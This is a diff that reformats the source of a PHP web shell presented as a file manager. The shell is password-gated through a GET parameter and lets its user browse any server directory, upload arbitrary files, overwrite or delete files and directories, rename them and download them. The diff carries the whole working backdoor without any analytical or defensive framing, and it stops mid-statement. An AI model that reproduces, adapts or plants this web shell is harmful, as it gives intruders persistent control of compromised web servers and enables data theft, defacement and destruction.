@@ -2,12 +2,17 @@
 session_start();
 $auth_logged = "$2y$10$7wPtyKE4gpC5m3nLDAS7Ke2fMunDIV1iOpseMk6xnLZ3WlfZUiIXS";
 
-if (isset($_SESSION[$_SERVER['HTTP_HOST']], $auth_logged[$_SESSION[$_SERVER['HTTP_HOST']]])) {
-	// logged
+if (
+    isset(
+        $_SESSION[$_SERVER['HTTP_HOST']],
+        $auth_logged[$_SESSION[$_SERVER['HTTP_HOST']]]
+    )
+) {
+    // logged
 } elseif (isset($_GET['x'])) {
-	if (password_verify($_GET['x'], $auth_logged)) {
-		$_SESSION[$_SERVER['HTTP_HOST']] = $_GET['x'];
-	}
+    if (password_verify($_GET['x'], $auth_logged)) {
+        $_SESSION[$_SERVER['HTTP_HOST']] = $_GET['x'];
+    }
 }
 exit();
 ?>
@@ -330,30 +335,32 @@ input[type=text].search:focus {
     <tbody>
 <?php
 date_default_timezone_set('Asia/Jakarta');
-function cwd() {
-	if (isset($_GET['dir'])) {
-		$cwd = $_GET['dir'];
-		chdir($cwd);
-	} else {
-		$cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
-	} return $cwd;
+function cwd()
+{
+    if (isset($_GET['dir'])) {
+        $cwd = $_GET['dir'];
+        chdir($cwd);
+    } else {
+        $cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
+    }
+    return $cwd;
 }
-function src($dir, $keyword) {
-	?>
+function src($dir, $keyword)
+{
+    ?>
 	<tr>
 		<td class="td">
 			<span><h4>RESULT : <u><i><?= $keyword ?></i></u></h4></span>
 		</td>
 	</tr>
-	<?php
-    $path = scandir($dir); ?>
+	<?php $path = scandir($dir); ?>
     <?php foreach ($path as $file) {
-    	$value = $dir.DIRECTORY_SEPARATOR.$file;
-        if(preg_match('/'.$keyword.'/i', $value)) {
+        $value = $dir . DIRECTORY_SEPARATOR . $file;
+        if (preg_match('/' . $keyword . '/i', $value)) {
             if (is_dir($value)) { ?>
                 <tr class="hover">
                     <td class="td">
-                    	<input type='checkbox' form="data" name='data[]' value="<?=$value?>">&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='<?= $file ?>'>
+                    	<input type='checkbox' form="data" name='data[]' value="<?= $value ?>">&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='<?= $file ?>'>
                         <a href="?dir=<?= $value ?>"><?= basename($value) ?></a>
                     </td>
                     <td class="screen"><center>--</center></td>
@@ -375,87 +382,122 @@ function src($dir, $keyword) {
 						</td>
 					</form>
 				</tr>
-            <?php }  elseif (is_file($value)) { ?>
+            <?php } elseif (is_file($value)) { ?>
                 <tr class="hover">
                     <td class="td">
-                    	<input type='checkbox' form="data" name='data[]' value="<?=$value?>">
+                    	<input type='checkbox' form="data" name='data[]' value="<?= $value ?>">
                         <?php
-                        print("<img class='icon' src='");
+                        print "<img class='icon' src='";
                         $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                         switch ($ext) {
-                        	case 'php':
-								print("https://image.flaticon.com/icons/png/128/337/337947.png");
-								break;
-							case 'pl':
-								print("https://image.flaticon.com/icons/svg/186/186645.svg");
-								break;
-							case 'xml':
-								print("https://image.flaticon.com/icons/svg/136/136526.svg");
-								break;
-							case 'json':
-								print("https://image.flaticon.com/icons/svg/136/136525.svg");
-								break;
-							case 'exe':
-								print("https://image.flaticon.com/icons/svg/136/136531.svg");
-								break;
-							case 'png':
-								print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
-								break;
-							case 'html':
-								print("https://image.flaticon.com/icons/png/128/136/136528.png");
-								break;
-							case 'css':
-								print("https://image.flaticon.com/icons/png/128/136/136527.png");
-								break;
-							case 'ico':
-								print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
-								break;
-							case 'jpg':
-								print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
-								break;
-							case 'jpeg':
-								print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
-								break;
-							case 'gif':
-								print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
-								break;
-							case 'pdf':
-								print("https://image.flaticon.com/icons/png/128/136/136522.png");
-								break;
-							case 'mp4':
-								print("https://image.flaticon.com/icons/png/128/136/136545.png");
-								break;
-							case 'py':
-								print("https://image.flaticon.com/icons/png/128/180/180867.png");
-								break;
-							case 'c':
-								print("https://image.flaticon.com/icons/svg/2306/2306037.svg");
-								break;
-							case 'bmp':
-								print("https://image.flaticon.com/icons/svg/337/337925.svg");
-								break;
-							case 'cpp':
-								print("https://image.flaticon.com/icons/svg/2306/2306030.svg");
-								break;
-							case 'txt':
-								print("https://image.flaticon.com/icons/png/128/136/136538.png");
-								break;
-							case 'zip':
-								print("https://image.flaticon.com/icons/png/128/136/136544.png");
-								break;
-							case 'js':
-								print("https://image.flaticon.com/icons/png/128/1126/1126856.png");
-								break;
-							case 'dll':
-								print("https://image.flaticon.com/icons/svg/2306/2306057.svg");
-								break;
-							default:
-								print("https://image.flaticon.com/icons/svg/833/833524.svg");
-				 				break;
-				 			}
-				 			print("' title='{$file}'>");
-				 			$href = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($value));
-				 			?>
+                            case 'php':
+                                print "https://image.flaticon.com/icons/png/128/337/337947.png";
+                                break;
+                            case 'pl':
+                                print "https://image.flaticon.com/icons/svg/186/186645.svg";
+                                break;
+                            case 'xml':
+                                print "https://image.flaticon.com/icons/svg/136/136526.svg";
+                                break;
+                            case 'json':
+                                print "https://image.flaticon.com/icons/svg/136/136525.svg";
+                                break;
+                            case 'exe':
+                                print "https://image.flaticon.com/icons/svg/136/136531.svg";
+                                break;
+                            case 'png':
+                                print "http://" .
+                                    $_SERVER['HTTP_HOST'] .
+                                    str_replace(
+                                        $_SERVER['DOCUMENT_ROOT'],
+                                        '',
+                                        cwd() . '/' . basename($file)
+                                    ) .
+                                    "";
+                                break;
+                            case 'html':
+                                print "https://image.flaticon.com/icons/png/128/136/136528.png";
+                                break;
+                            case 'css':
+                                print "https://image.flaticon.com/icons/png/128/136/136527.png";
+                                break;
+                            case 'ico':
+                                print "https://image.flaticon.com/icons/png/128/1126/1126873.png";
+                                break;
+                            case 'jpg':
+                                print "http://" .
+                                    $_SERVER['HTTP_HOST'] .
+                                    str_replace(
+                                        $_SERVER['DOCUMENT_ROOT'],
+                                        '',
+                                        cwd() . '/' . basename($file)
+                                    ) .
+                                    "";
+                                break;
+                            case 'jpeg':
+                                print "http://" .
+                                    $_SERVER['HTTP_HOST'] .
+                                    str_replace(
+                                        $_SERVER['DOCUMENT_ROOT'],
+                                        '',
+                                        cwd() . '/' . basename($file)
+                                    ) .
+                                    "";
+                                break;
+                            case 'gif':
+                                print "http://" .
+                                    $_SERVER['HTTP_HOST'] .
+                                    str_replace(
+                                        $_SERVER['DOCUMENT_ROOT'],
+                                        '',
+                                        cwd() . '/' . basename($file)
+                                    ) .
+                                    "";
+                                break;
+                            case 'pdf':
+                                print "https://image.flaticon.com/icons/png/128/136/136522.png";
+                                break;
+                            case 'mp4':
+                                print "https://image.flaticon.com/icons/png/128/136/136545.png";
+                                break;
+                            case 'py':
+                                print "https://image.flaticon.com/icons/png/128/180/180867.png";
+                                break;
+                            case 'c':
+                                print "https://image.flaticon.com/icons/svg/2306/2306037.svg";
+                                break;
+                            case 'bmp':
+                                print "https://image.flaticon.com/icons/svg/337/337925.svg";
+                                break;
+                            case 'cpp':
+                                print "https://image.flaticon.com/icons/svg/2306/2306030.svg";
+                                break;
+                            case 'txt':
+                                print "https://image.flaticon.com/icons/png/128/136/136538.png";
+                                break;
+                            case 'zip':
+                                print "https://image.flaticon.com/icons/png/128/136/136544.png";
+                                break;
+                            case 'js':
+                                print "https://image.flaticon.com/icons/png/128/1126/1126856.png";
+                                break;
+                            case 'dll':
+                                print "https://image.flaticon.com/icons/svg/2306/2306057.svg";
+                                break;
+                            default:
+                                print "https://image.flaticon.com/icons/svg/833/833524.svg";
+                                break;
+                        }
+                        print "' title='{$file}'>";
+                        $href =
+                            "http://" .
+                            $_SERVER['HTTP_HOST'] .
+                            str_replace(
+                                $_SERVER['DOCUMENT_ROOT'],
+                                '',
+                                cwd() . '/' . basename($value)
+                            );
+                        ?>
 				 			<a href="<?= $href ?>" target='_blank'><?= basename($value) ?></a>
 				 		</td>
 				 		<td class="screen">
@@ -485,8 +527,7 @@ function src($dir, $keyword) {
 				 		</tr>
 				 	<?php }
         }
-    }
-    ?>
+    } ?>
 <tr>
 	<thead>
 		<form method="post" id="data">
@@ -501,79 +542,136 @@ function src($dir, $keyword) {
 </tr>
 <?php
 }
-function perms($file) {
-$perms = fileperms($file);
+function perms($file)
+{
+    $perms = fileperms($file);
 
-switch ($perms & 0xF000) {
-    case 0xC000: $info = 's'; break;
-    case 0xA000: $info = 'l'; break;
-    case 0x8000: $info = 'r'; break;
-    case 0x6000: $info = 'b'; break;
-    case 0x4000: $info = 'd'; break;
-    case 0x2000: $info = 'c'; break;
-    case 0x1000: $info = 'p'; break;
-    default: $info = 'u';
-}
+    switch ($perms & 0xf000) {
+        case 0xc000:
+            $info = 's';
+            break;
+        case 0xa000:
+            $info = 'l';
+            break;
+        case 0x8000:
+            $info = 'r';
+            break;
+        case 0x6000:
+            $info = 'b';
+            break;
+        case 0x4000:
+            $info = 'd';
+            break;
+        case 0x2000:
+            $info = 'c';
+            break;
+        case 0x1000:
+            $info = 'p';
+            break;
+        default:
+            $info = 'u';
+    }
 
-$info .= (($perms & 0x0100) ? 'r' : '-');
-$info .= (($perms & 0x0080) ? 'w' : '-');
-$info .= (($perms & 0x0040) ?
-         (($perms & 0x0800) ? 's' : 'x' ) :
-         (($perms & 0x0800) ? 'S' : '-'));
-$info .= (($perms & 0x0020) ? 'r' : '-');
-$info .= (($perms & 0x0010) ? 'w' : '-');
-$info .= (($perms & 0x0008) ?
-         (($perms & 0x0400) ? 's' : 'x' ) :
-         (($perms & 0x0400) ? 'S' : '-'));
+    $info .= $perms & 0x0100 ? 'r' : '-';
+    $info .= $perms & 0x0080 ? 'w' : '-';
+    $info .=
+        $perms & 0x0040
+            ? ($perms & 0x0800
+                ? 's'
+                : 'x')
+            : ($perms & 0x0800
+                ? 'S'
+                : '-');
+    $info .= $perms & 0x0020 ? 'r' : '-';
+    $info .= $perms & 0x0010 ? 'w' : '-';
+    $info .=
+        $perms & 0x0008
+            ? ($perms & 0x0400
+                ? 's'
+                : 'x')
+            : ($perms & 0x0400
+                ? 'S'
+                : '-');
 
-$info .= (($perms & 0x0004) ? 'r' : '-');
-$info .= (($perms & 0x0002) ? 'w' : '-');
-$info .= (($perms & 0x0001) ?
-         (($perms & 0x0200) ? 't' : 'x' ) :
-         (($perms & 0x0200) ? 'T' : '-'));
-return $info;
+    $info .= $perms & 0x0004 ? 'r' : '-';
+    $info .= $perms & 0x0002 ? 'w' : '-';
+    $info .=
+        $perms & 0x0001
+            ? ($perms & 0x0200
+                ? 't'
+                : 'x')
+            : ($perms & 0x0200
+                ? 'T'
+                : '-');
+    return $info;
 }
-function permission($filename, $perms, $po=false) {
-  if (is_writable($filename)) {
-    ?> <font color="green"><?php print $perms ?></font> <?php
-  } else {
-    ?> <font color="red"><?php print $perms ?></font> <?php
-  }
+function permission($filename, $perms, $po = false)
+{
+    if (
+        is_writable($filename)
+    ) { ?> <font color="green"><?php print $perms; ?></font> <?php } else { ?> <font color="red"><?php print $perms; ?></font> <?php }
 }
-function alert($msg, $type) {
-	?>
-	<div class="alert punten <?=$type?>"><?= $msg ?></div>
+function alert($msg, $type)
+{
+    ?>
+	<div class="alert punten <?= $type ?>"><?= $msg ?></div>
 	<?php
 }
-function download($filename) {
-	if(ini_get('zlib.output_compression'))
-		ini_set('zlib.output_compression', 'Off');
-	$file_extension = strtolower(substr(strrchr($filename,"."),1));
-	switch( $file_extension ){
-		case "pdf": $ctype="application/pdf"; break;
-		case "exe": $ctype="application/octet-stream"; break;
-		case "zip": $ctype="application/zip"; break;
-  		case "doc": $ctype="application/msword"; break;
-  		case "xls": $ctype="application/vnd.ms-excel"; break;
-  		case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
-  		case "gif": $ctype="image/gif"; break;
-  		case "png": $ctype="image/png"; break;
-  		case "jpeg":
-  		case "jpg": $ctype="image/jpg"; break;
-  		default: $ctype="application/force-download";
-  	}
-	@header("Pragma: public"); // required
-	@header("Expires: 0");
-	@header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
-	@header("Cache-Control: private",false);
-	@header("Content-Type: $ctype");
-	@header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
-	@header("Content-Transfer-Encoding: binary");
-	@header("Content-Length: ".filesize($filename));
-	readfile("$filename");
-	exit();
+function download($filename)
+{
+    if (ini_get('zlib.output_compression')) {
+        ini_set('zlib.output_compression', 'Off');
+    }
+    $file_extension = strtolower(substr(strrchr($filename, "."), 1));
+    switch ($file_extension) {
+        case "pdf":
+            $ctype = "application/pdf";
+            break;
+        case "exe":
+            $ctype = "application/octet-stream";
+            break;
+        case "zip":
+            $ctype = "application/zip";
+            break;
+        case "doc":
+            $ctype = "application/msword";
+            break;
+        case "xls":
+            $ctype = "application/vnd.ms-excel";
+            break;
+        case "ppt":
+            $ctype = "application/vnd.ms-powerpoint";
+            break;
+        case "gif":
+            $ctype = "image/gif";
+            break;
+        case "png":
+            $ctype = "image/png";
+            break;
+        case "jpeg":
+        case "jpg":
+            $ctype = "image/jpg";
+            break;
+        default:
+            $ctype = "application/force-download";
+    }
+    @header("Pragma: public"); // required
+    @header("Expires: 0");
+    @header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+    @header("Cache-Control: private", false);
+    @header("Content-Type: $ctype");
+    @header(
+        "Content-Disposition: attachment; filename=\"" .
+            basename($filename) .
+            "\";"
+    );
+    @header("Content-Transfer-Encoding: binary");
+    @header("Content-Length: " . filesize($filename));
+    readfile("$filename");
+    exit();
 }
-function size($file) {
+function size($file)
+{
     $bytes = filesize($file);
 
     if ($bytes >= 1073741824) {
@@ -590,38 +688,37 @@ function size($file) {
         return '0 bytes';
     }
 }
-function delete($filename) {
-  if (@is_dir($filename)) {
-    $scandir = @scandir($filename);
-    foreach ($scandir as $object) {
-      if ($object != '.' && $object != '..') {
-        if (@is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
-          @delete($filename.DIRECTORY_SEPARATOR.$object);
-        } else {
-          @unlink($filename.DIRECTORY_SEPARATOR.$object);
+function delete($filename)
+{
+    if (@is_dir($filename)) {
+        $scandir = @scandir($filename);
+        foreach ($scandir as $object) {
+            if ($object != '.' && $object != '..') {
+                if (@is_dir($filename . DIRECTORY_SEPARATOR . $object)) {
+                    @delete($filename . DIRECTORY_SEPARATOR . $object);
+                } else {
+                    @unlink($filename . DIRECTORY_SEPARATOR . $object);
+                }
+            }
         }
-      }
-    } if (@rmdir($filename)) {
-      return true;
+        if (@rmdir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
     } else {
-      return false;
+        if (@unlink($filename)) {
+            return true;
+        } else {
+            return false;
+        }
     }
-  } else {
-    if (@unlink($filename)) {
-      return true;
-    } else {
-      return false;
-    }
-  }
 }
-switch (@$_POST['tools']) {
-	case 'home':
-		?>
-		<script type="text/javascript">window.location='http://<?=$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']?>'</script>
-		<?php
-		break;
-	case 'upload':
-		?>
+switch (@$_POST['tools']) { case 'home': ?>
+		<script type="text/javascript">window.location='http://<?= $_SERVER[
+      'SERVER_NAME'
+  ] . $_SERVER['SCRIPT_NAME'] ?>'</script>
+		<?php break;case 'upload': ?>
 			<form method="post" enctype="multipart/form-data">
 				<tr>
 					<td class="action">
@@ -635,60 +732,56 @@ switch (@$_POST['tools']) {
 				</tr>
 			</form>
 			<?php
-			if (isset($_POST['submit'])) {
-				$file = count($_FILES['file']['tmp_name']);
-				for ($i=0; $i < $file ; $i++) { 
-					if (copy($_FILES['file']['tmp_name'][$i] , cwd().'/'.$_FILES['file']['name'][$i])) {
-						?>
+   if (isset($_POST['submit'])) {
+       $file = count($_FILES['file']['tmp_name']);
+       for ($i = 0; $i < $file; $i++) {
+           if (
+               copy(
+                   $_FILES['file']['tmp_name'][$i],
+                   cwd() . '/' . $_FILES['file']['name'][$i]
+               )
+           ) { ?>
 						<tr>
 							<td class="action">
-								<?= alert($_FILES['file']['name'][$i]." uploaded", "success") ?>
+								<?= alert($_FILES['file']['name'][$i] . " uploaded", "success") ?>
 							</td>
 						</tr>
-						<?php
-					} else {
-						?>
+						<?php } else { ?>
 						<tr>
 							<td class="action">
-								<?= alert("permission danied","failed") ?>
+								<?= alert("permission danied", "failed") ?>
 							</td>
 						</tr>
-						<?php
-					}
-				}
-			}
-			exit();
-		break;
-		case 'search':
-			if (isset($_POST['keyword'])) {
-				src(cwd(), $_POST['keyword']);
-			}
-			exit();
-			break;
+						<?php }
+       }
+   }
+   exit();
+   break;
+   case 'search':
+        if (isset($_POST['keyword'])) {
+            src(cwd(), $_POST['keyword']);
+        }
+        exit();
+        break;
 }
 switch (@$_POST['action']) {
-	case 'edit':
-		if (isset($_POST['submit'])) {
-			$handle = fopen($_POST['file'], "w");
-			if (fwrite($handle, $_POST['text'])) {
-				?>
+    case 'edit':
+        if (isset($_POST['submit'])) {
+            $handle = fopen($_POST['file'], "w");
+            if (fwrite($handle, $_POST['text'])) { ?>
 				<tr>
 					<td class="action">
-						<?= alert("".basename($_POST['file'])." updated", 'success') ?>
+						<?= alert("" . basename($_POST['file']) . " updated", 'success') ?>
 					</td>
 				</tr>
-				<?php
-			} else {
-				?>
+				<?php } else { ?>
 				<tr>
 					<td class="action">
 						<?= alert("permission danied", 'failed') ?>
 					</td>
 				</tr>
-				<?php
-			}
-		}
-		?>
+				<?php }
+        } ?>
 			<tr>
 				<td class="action">
 					Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
@@ -697,7 +790,7 @@ switch (@$_POST['action']) {
 					Size : <?= size($_POST['file']) ?>
 				</td>
 				<td class="action">
-					Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
+					Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])) ?>
 				</td>
 				<form method="post">
 				<td class="action">
@@ -714,7 +807,9 @@ switch (@$_POST['action']) {
 			<form method="post">
 			<tr>
 				<td class="action">
-					<textarea class="edit" name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+					<textarea class="edit" name="text"><?= htmlspecialchars(
+         file_get_contents($_POST['file'])
+     ) ?></textarea>
 				</td>
 			</tr>
 			<tr>
@@ -726,29 +821,27 @@ switch (@$_POST['action']) {
 			</tr>
 		</form>
 		<?php
-		exit();
-		break;
-	case 'delete':
-		delete($_POST['file']);
-		break;
-	case 'rename':
-		if (isset($_POST['submit'])) {
-			if (rename($_POST['file'], $_POST['newname'])) {
-				?> <script>window.location='?dir=<?=cwd()?>'</script> <?php
-			} else {
-				?>
+  exit();
+  break;
+
+    case 'delete':
+        delete($_POST['file']);
+        break;
+    case 'rename':
+        if (isset($_POST['submit'])) {
+            if (
+                rename($_POST['file'], $_POST['newname'])
+            ) { ?> <script>window.location='?dir=<?= cwd() ?>'</script> <?php } else { ?>
 				<tr>
 					<td class="action">
 						<?= alert("permission danied", 'failed') ?>
 					</td>
 				</tr>
-				<?php
-			}
-		}
-		switch ($_POST['file']) {
-			case @filetype($_POST['file']) == 'dir':
-				if (is_dir($_POST['file'])) {
-					?>
+				<?php }
+        }
+        switch ($_POST['file']) {
+            case @filetype($_POST['file']) == 'dir':
+                if (is_dir($_POST['file'])) { ?>
 					<tr>
 						<td class="action">
 							Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
@@ -757,7 +850,7 @@ switch (@$_POST['action']) {
 							Size : <?= size($_POST['file']) ?>
 						</td>
 						<td class="action">
-							Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
+							Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])) ?>
 						</td>
 						<form method="post">
 						<td class="action">
@@ -784,13 +877,11 @@ switch (@$_POST['action']) {
 						</td>
 					</tr>
 				</form>
-				<?php
-				}
-				break;
-			
-			case @filetype($_POST['file']) == 'file':
-				if (is_file($_POST['file'])) {
-					?>
+				<?php }
+                break;
+
+            case @filetype($_POST['file']) == 'file':
+                if (is_file($_POST['file'])) { ?>
 					<tr>
 						<td class="action">
 							Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
@@ -799,7 +890,7 @@ switch (@$_POST['action']) {
 							Size : <?= size($_POST['file']) ?>
 						</td>
 						<td class="action">
-							Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
+							Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])) ?>
 						</td>
 						<form method="post">
 						<td class="action">
@@ -827,51 +918,69 @@ switch (@$_POST['action']) {
 						</td>
 					</tr>
 				</form>
-				<?php
-				}
-				break;
-			}
-		exit();
-		break;
-	case 'back':
-		@header("Location: ?dir=".cwd()."");
-		break;
-	case 'download':
-		download($_POST['file']);
-		break;
+				<?php }
+                break;
+        }
+        exit();
+        break;
+    case 'back':
+        @header("Location: ?dir=" . cwd() . "");
+        break;
+    case 'download':
+        download($_POST['file']);
+        break;
 }
-if(function_exists('opendir')) {
-	if($opendir = opendir(cwd())) {
-		while(($readdir = readdir($opendir)) !== false) {
-			$getpath[] = $readdir;
-		} closedir($opendir);
-	} sort($getpath);
+if (function_exists('opendir')) {
+    if ($opendir = opendir(cwd())) {
+        while (($readdir = readdir($opendir)) !== false) {
+            $getpath[] = $readdir;
+        }
+        closedir($opendir);
+    }
+    sort($getpath);
 } else {
-	$getpath = scandir(cwd());
+    $getpath = scandir(cwd());
 }
 foreach ($getpath as $dir) {
-	if (!is_dir($dir) || $dir === '.') continue;
-		if ($dir === '..') {
-			$back = "<input type='checkbox' onchange='checkAll(this)'>&nbsp&nbsp<a href='?dir=".dirname(cwd())."'>
+
+    if (!is_dir($dir) || $dir === '.') {
+        continue;
+    }
+    if ($dir === '..') {
+        $back =
+            "<input type='checkbox' onchange='checkAll(this)'>&nbsp&nbsp<a href='?dir=" .
+            dirname(cwd()) .
+            "'>
 					 <img class='icon' src='https://image.flaticon.com/icons/svg/271/271218.svg' title='back'>
 					 </a>";
-		} else {
-			$back = "<input form='data' name='data[]' value='{$dir}' type='checkbox'>&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='{$dir}'>&nbsp&nbsp<a href='?dir=".cwd().'/'.$dir."'>{$dir}</a>";
-		} if ($dir === '.' || $dir === '..') {
-			$action = "<td class='dir'></td>";
-		} else {
-			$action = '<form method="post">
+    } else {
+        $back =
+            "<input form='data' name='data[]' value='{$dir}' type='checkbox'>&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='{$dir}'>&nbsp&nbsp<a href='?dir=" .
+            cwd() .
+            '/' .
+            $dir .
+            "'>{$dir}</a>";
+    }
+    if ($dir === '.' || $dir === '..') {
+        $action = "<td class='dir'></td>";
+    } else {
+        $action =
+            '<form method="post">
 							<td class="dir">
 								<select class="action" style="float:right;" name="action" onchange="if(this.value != 0) { this.form.submit(); }"">
 									<option selected>choose . .</option>
 									<option value="delete">delete</option>
 									<option value="rename">rename</option>
 								</select>
-								<input type="hidden" name="file" value="'.cwd().'/'.$dir.'">
+								<input type="hidden" name="file" value="' .
+            cwd() .
+            '/' .
+            $dir .
+            '">
 							</td>
 					  </form>';
-		}
-		?>
+    }
+    ?>
 		<tr class="hover">
 			<td class="td">
 				<?= $back ?>
@@ -890,88 +999,122 @@ foreach ($getpath as $dir) {
 		<?php
 }
 foreach ($getpath as $file) {
-	if (is_file($file)) {
-		?>
+    if (is_file($file)) { ?>
 		<tr class="hover">
 			<td class="td">
-				<input type='checkbox' form="data" name='data[]' value="<?=$file?>">
+				<input type='checkbox' form="data" name='data[]' value="<?= $file ?>">
 				<?php
-				print("<img class='icon' src='");
-				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-				switch ($ext) {
-					case 'php':
-						print("https://image.flaticon.com/icons/png/128/337/337947.png");
-						break;
-					case 'pl':
-						print("https://image.flaticon.com/icons/svg/186/186645.svg");
-						break;
-					case 'xml':
-						print("https://image.flaticon.com/icons/svg/136/136526.svg");
-						break;
-					case 'json':
-						print("https://image.flaticon.com/icons/svg/136/136525.svg");
-						break;
-					case 'exe':
-						print("https://image.flaticon.com/icons/svg/136/136531.svg");
-						break;
-					case 'png':
-						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
-						break;
-					case 'html':
-						print("https://image.flaticon.com/icons/png/128/136/136528.png");
-						break;
-					case 'css':
-						print("https://image.flaticon.com/icons/png/128/136/136527.png");
-						break;
-					case 'ico':
-						print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
-						break;
-					case 'jpg':
-						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
-						break;
-					case 'jpeg':
-						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
-						break;
-					case 'gif':
-						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
-						break;
-					case 'pdf':
-						print("https://image.flaticon.com/icons/png/128/136/136522.png");
-						break;
-					case 'mp4':
-						print("https://image.flaticon.com/icons/png/128/136/136545.png");
-						break;
-					case 'py':
-						print("https://image.flaticon.com/icons/png/128/180/180867.png");
-						break;
-					case 'c':
-						print("https://image.flaticon.com/icons/svg/2306/2306037.svg");
-						break;
-					case 'bmp':
-						print("https://image.flaticon.com/icons/svg/337/337925.svg");
-						break;
-					case 'cpp':
-						print("https://image.flaticon.com/icons/svg/2306/2306030.svg");
-						break;
-					case 'txt':
-						print("https://image.flaticon.com/icons/png/128/136/136538.png");
-						break;
-					case 'zip':
-						print("https://image.flaticon.com/icons/png/128/136/136544.png");
-						break;
-					case 'js':
-						print("https://image.flaticon.com/icons/png/128/1126/1126856.png");
-						break;
-					case 'dll':
-						print("https://image.flaticon.com/icons/svg/2306/2306057.svg");
-						break;
-					default:
-						print("https://image.flaticon.com/icons/svg/833/833524.svg");
-				 		break;
-				}
-				 	print("' title='{$file}'>");
-				$href = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file));
-				?>
+    print "<img class='icon' src='";
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    switch ($ext) {
+        case 'php':
+            print "https://image.flaticon.com/icons/png/128/337/337947.png";
+            break;
+        case 'pl':
+            print "https://image.flaticon.com/icons/svg/186/186645.svg";
+            break;
+        case 'xml':
+            print "https://image.flaticon.com/icons/svg/136/136526.svg";
+            break;
+        case 'json':
+            print "https://image.flaticon.com/icons/svg/136/136525.svg";
+            break;
+        case 'exe':
+            print "https://image.flaticon.com/icons/svg/136/136531.svg";
+            break;
+        case 'png':
+            print "http://" .
+                $_SERVER['HTTP_HOST'] .
+                str_replace(
+                    $_SERVER['DOCUMENT_ROOT'],
+                    '',
+                    cwd() . '/' . basename($file)
+                ) .
+                "";
+            break;
+        case 'html':
+            print "https://image.flaticon.com/icons/png/128/136/136528.png";
+            break;
+        case 'css':
+            print "https://image.flaticon.com/icons/png/128/136/136527.png";
+            break;
+        case 'ico':
+            print "https://image.flaticon.com/icons/png/128/1126/1126873.png";
+            break;
+        case 'jpg':
+            print "http://" .
+                $_SERVER['HTTP_HOST'] .
+                str_replace(
+                    $_SERVER['DOCUMENT_ROOT'],
+                    '',
+                    cwd() . '/' . basename($file)
+                ) .
+                "";
+            break;
+        case 'jpeg':
+            print "http://" .
+                $_SERVER['HTTP_HOST'] .
+                str_replace(
+                    $_SERVER['DOCUMENT_ROOT'],
+                    '',
+                    cwd() . '/' . basename($file)
+                ) .
+                "";
+            break;
+        case 'gif':
+            print "http://" .
+                $_SERVER['HTTP_HOST'] .
+                str_replace(
+                    $_SERVER['DOCUMENT_ROOT'],
+                    '',
+                    cwd() . '/' . basename($file)
+                ) .
+                "";
+            break;
+        case 'pdf':
+            print "https://image.flaticon.com/icons/png/128/136/136522.png";
+            break;
+        case 'mp4':
+            print "https://image.flaticon.com/icons/png/128/136/136545.png";
+            break;
+        case 'py':
+            print "https://image.flaticon.com/icons/png/128/180/180867.png";
+            break;
+        case 'c':
+            print "https://image.flaticon.com/icons/svg/2306/2306037.svg";
+            break;
+        case 'bmp':
+            print "https://image.flaticon.com/icons/svg/337/337925.svg";
+            break;
+        case 'cpp':
+            print "https://image.flaticon.com/icons/svg/2306/2306030.svg";
+            break;
+        case 'txt':
+            print "https://image.flaticon.com/icons/png/128/136/136538.png";
+            break;
+        case 'zip':
+            print "https://image.flaticon.com/icons/png/128/136/136544.png";
+            break;
+        case 'js':
+            print "https://image.flaticon.com/icons/png/128/1126/1126856.png";
+            break;
+        case 'dll':
+            print "https://image.flaticon.com/icons/svg/2306/2306057.svg";
+            break;
+        default:
+            print "https://image.flaticon.com/icons/svg/833/833524.svg";
+            break;
+    }
+    print "' title='{$file}'>";
+    $href =
+        "http://" .
